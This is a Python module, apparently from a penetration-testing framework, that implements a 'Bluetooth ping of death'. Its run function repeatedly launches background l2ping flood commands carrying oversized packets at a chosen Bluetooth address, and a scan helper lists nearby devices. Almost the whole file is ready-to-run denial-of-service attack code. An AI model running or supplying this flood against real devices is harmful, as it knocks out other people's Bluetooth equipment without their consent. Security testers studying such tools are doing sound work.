#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)

import sys
import os
import subprocess
import time
from core import bcolors
from collections import OrderedDict

#info about module
#modules name
modulename = "bluetooth_pod"
#version
version = "1.0"
#description
desc = "bluetooth ping of death"
#created by
createdby = "4shadoww"
#email
email = "4shadoww0@gmail.com"

needroot = 1

#list
variables = OrderedDict((
('interface', 'hci0'),
('bdaddr', 'none'),
('size', '600'),
))

#description for variables
vdesc = [
'interface',
'target bluetooth address',
'size of packets (default 600)',
]

#custom commands
customcommands = (
'scan'
)

#help for customcommands (remove if you will not use customcommands)
mhelp = OrderedDict((
('scan', 'scan for devices'),
))

#terminal from main
terminal = None

#simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	print(bcolors.OKBLUE + "[*]Bluetooth Ping Of Death Attack Started ..." + bcolors.END)
	try:
		for i in range(1, 10000):
			xterm_1 = "l2ping -i %s -s %s -f %s &" % (variables['interface'], variables['size'], variables['bdaddr'])
			subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			time.sleep(3)
	except(OSError):
		print(bcolors.WARNING + "[*] Something Is Wrong!" + bcolors.END)


def scan():
	os.system("hcitool scan")